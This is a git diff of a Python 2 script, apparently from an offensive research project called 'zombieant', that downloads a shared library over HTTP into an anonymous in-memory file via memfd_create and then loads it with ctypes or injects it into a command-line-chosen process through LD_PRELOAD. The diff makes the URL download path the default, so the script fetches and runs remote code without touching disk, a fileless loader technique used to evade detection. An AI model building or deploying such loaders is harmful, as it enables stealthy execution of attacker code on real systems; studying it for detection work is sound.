@@ -2,6 +2,7 @@ from __future__ import print_function # Only Python 2.x
 import ctypes
 import fcntl
 import os
+import sys
 import subprocess 
 import urllib2
 
@@ -78,7 +79,7 @@ def urlToMemd(furl):
 
 
     soMemFd = ctypes.CDLL(None).syscall(NR_memfd_create,"/dev/shm/ipcs/0x88778848",1)
-    soMemPath = "/proc/self/fd/" + str(soMemFd)
+    soMemPath = "/proc/" + str(os.getpid()) + "/fd/" + str(soMemFd)
     print("PID: ", os.getpid(), "Mem path: ", soMemPath)
 
     fd = open(soMemPath, 'wb')
@@ -124,7 +125,7 @@ def fileToShm(soPath):
 
 def executeP(soPath):
 
-    sleep(100000000)
+    #sleep(100000000)
     ctypes.CDLL(soPath)
     #TODO: ctypes.CDLL('main.so',mode=ctypes.RTLD_GLOBAL)
     #TODO: ctypes.CDLL('dependent.so', mode=1) # RTLD_LAZY
@@ -132,9 +133,11 @@ def executeP(soPath):
 def executePLD(soPath, cmd):
     os.environ["LD_PRELOAD"] = soPath
 
+    print("launching ", cmd)
     popen = subprocess.Popen(cmd, 
 			stdout=subprocess.PIPE, 
 			stderr=subprocess.PIPE, 
+                        cwd="/tmp",
 			env=os.environ)
     print("PID: %s" % popen.pid)
 
@@ -143,21 +146,26 @@ def executePLD(soPath, cmd):
 
     popen.stdout.close()
     return_code = popen.wait()
-    if return_code:
-        raise subprocess.CalledProcessError(return_code, cmd)
+    return_code
 
 
 
 if __name__ == '__main__':
 
+    if len(sys.argv) < 2:
+        raise ValueError("Need file to preload")
+
     soPath = "/root/Code/zombieant/lib/libmctor.so"
     urlSoPath = "http://127.0.0.1:8080/libmctor.so"
     fPath = "/tmp/pypipe"
-    cmd="/bin/ls"
-    cmd_args="/tmp"
+    cmd=sys.argv[1]
+    print("Cmd: ", cmd)
+    cmd_args=" ".join(sys.argv[2:])
+    print("Cmd Args: ", cmd_args)
 
-    #soMemPath = urlToMemd(urlSoPath)
-    soMemPath = fileToMemd(soPath)
+    soMemPath = urlToMemd(urlSoPath)
+    print(soMemPath)
+    #soMemPath = fileToMemd(soPath)
     #soShmPath = fileToShm(soPath)
     #soPipePath = fileToPipe(soPath,"/tmp/pypipe")
 
